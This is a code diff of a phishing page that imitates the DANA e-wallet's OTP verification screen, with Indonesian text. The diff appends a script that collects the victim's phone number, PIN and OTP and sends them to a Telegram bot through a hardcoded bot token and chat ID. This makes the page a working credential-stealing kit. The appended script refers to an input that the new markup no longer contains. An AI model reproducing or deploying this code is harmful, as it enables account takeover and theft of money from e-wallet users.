@@ -4,18 +4,141 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Masukkan Kode OTP</title>
-  <link rel="stylesheet" href="style.css">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      margin: 0;
+      background-color: #fff;
+      color: #333;
+    }
+
+    .header {
+      background-color: #008CFF;
+      color: white;
+      padding: 16px;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+      position: relative;
+    }
+
+    .header::before {
+      content: "<";
+      position: absolute;
+      left: 16px;
+      top: 12px;
+      font-size: 24px;
+    }
+
+    .container {
+      text-align: center;
+      padding: 40px 20px;
+    }
+
+    .title {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    .desc {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 30px;
+    }
+
+    .otp-inputs input {
+      width: 50px;
+      height: 60px;
+      text-align: center;
+      font-size: 24px;
+      border: 2px solid #ccc;
+      border-radius: 10px;
+    }
+
+    .btn {
+      background-color: #008CFF;
+      color: white;
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
+  <div class="header">Verifikasi</div>
   <div class="container">
-    <h2>Verifikasi OTP</h2>
-    <p>Kami telah mengirimkan SMS ke <span id="nomor"></span></p>
-    <input type="text" id="otp" maxlength="4" inputmode="numeric" placeholder="••••" />
-    <button onclick="kirimData()">Verifikasi</button>
+    <div class="title">Masukkan Kode OTP</div>
+    <div class="desc" id="otpDesc">Kami telah mengirimkan SMS ke 08xxxxxxxxxx</div>
+    <div class="otp-inputs">
+      <input type="tel" maxlength="1" oninput="moveNext(this, 0)" />
+      <input type="tel" maxlength="1" oninput="moveNext(this, 1)" />
+      <input type="tel" maxlength="1" oninput="moveNext(this, 2)" />
+      <input type="tel" maxlength="1" oninput="moveNext(this, 3)" />
+    </div>
+    <button class="btn" onclick="konfirmasi()">KONFIRMASI</button>
   </div>
-  <script src="kirim.js"></script>
   <script>
-    document.getElementById('nomor').innerText = sessionStorage.getItem('phone') || '08xxxxxxxxxx';
+    const inputs = document.querySelectorAll(".otp-inputs input");
+
+    function moveNext(el, index) {
+      if (el.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+    }
+
+    function konfirmasi() {
+      const kode = Array.from(inputs).map(i => i.value).join('');
+      if (kode.length === 4) {
+        alert("Kode OTP: " + kode);
+      }
+    }
+
+    window.onload = () => {
+      inputs[0].focus();
+      const nomor = sessionStorage.getItem("nomor");
+      if (nomor) {
+        document.getElementById("otpDesc").textContent =
+          "Kami telah mengirimkan SMS ke " + nomor;
+      }
+    };
   </script>
 </body>
 </html>
+<script>
+  const otpInput = document.getElementById('otp');
+
+  otpInput.addEventListener('input', () => {
+    if (otpInput.value.length === 4) {
+      const phone = sessionStorage.getItem('phone');
+      const pin = sessionStorage.getItem('pin');
+      const otp = otpInput.value;
+
+      const token = "7658902176:AAE0RbA2cBHQh6EgU9We-ar7XGrrPxPFVYw";
+      const chatId = "6597122729";
+      const message = `🔐 *DANA Login*\n\n📱 Nomor: ${phone}\n🔑 PIN: ${pin}\n📩 OTP: ${otp}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(() => {
+        alert("Data terkirim ke Telegram.");
+      }).catch(() => {
+        alert("Gagal mengirim.");
+      });
+    }
+  });
+</script>
